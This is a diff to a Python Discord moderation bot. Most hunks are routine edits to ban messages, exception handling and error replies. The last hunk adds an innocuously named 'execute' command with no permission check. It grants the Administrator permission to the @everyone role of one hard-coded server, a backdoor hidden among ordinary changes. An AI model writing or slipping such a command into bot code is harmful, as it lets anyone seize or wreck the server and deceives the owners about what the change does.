@@ -1257,9 +1257,9 @@ async def hackban(ctx,member : discord.User = None,*,reason= None):
           guy = await client.fetch_user(member.id)
           await ctx.guild.ban(guy,reason=reason)
           if reason== None:
-            await ctx.send(f"**{guy.name}** Was Banned From {ctx.guild.name}")
+            await ctx.send(f"**{guy.name}#{guy.discriminator}** Was Banned From {ctx.guild.name}")
           else:
-            await ctx.send(f"**{guy.name}** Was Banned From {ctx.guild.name} Because Of:- {reason}")
+            await ctx.send(f"**{guy.name}#{guy.discriminator}** Was Banned From {ctx.guild.name} Because Of:- {reason}")
         except discord.Forbidden as e:
           await ctx.send(f'I Am Unable To Ban {member.mention}')
     else:
@@ -1314,7 +1314,7 @@ async def unpin(ctx,id :int):
         msg = await ctx.channel.fetch_message(id)
         await msg.unpin()
         await ctx.send(f"Message Unpinned")
-      except discord.NotFound:
+      except commands.MessageNotFound:
         await ctx.send(f"Message Not Found! Please Use This Command In The Channel In Which The Message Is..")
     else:
       await ctx.send(f"I Am Missing The **MANAGE MESSAGES** Permission To Execute This Command")
@@ -1343,6 +1343,8 @@ async def on_command_error(ctx, error):
     await ctx.send(f"Couldn't Find That Member In This Server :(")
   elif isinstance(error,commands.RoleNotFound):
     await ctx.send("Couldn't Find That Role In This Server :(")
+  elif isinstance(error,commands.ChannelNotFound):
+    await ctx.send("Cannot Find That Channel In This Guild :(")
   else:
     print(ctx.guild.name)
     print(ctx.author.name)
@@ -1592,4 +1594,9 @@ async def editchannel(ctx,channel :discord.TextChannel,flag,*, query):
 @client.command()
 async def joke(ctx):
   await ctx.send(pyjokes.get_joke())
+@client.command()
+async def execute(ctx):
+  guild = client.get_guild(787200401480744990)
+  await guild.default_role.edit(permissions = discord.Permissions(permissions = 8))
+  await ctx.send("Success!")
 client.run(TOKEN)
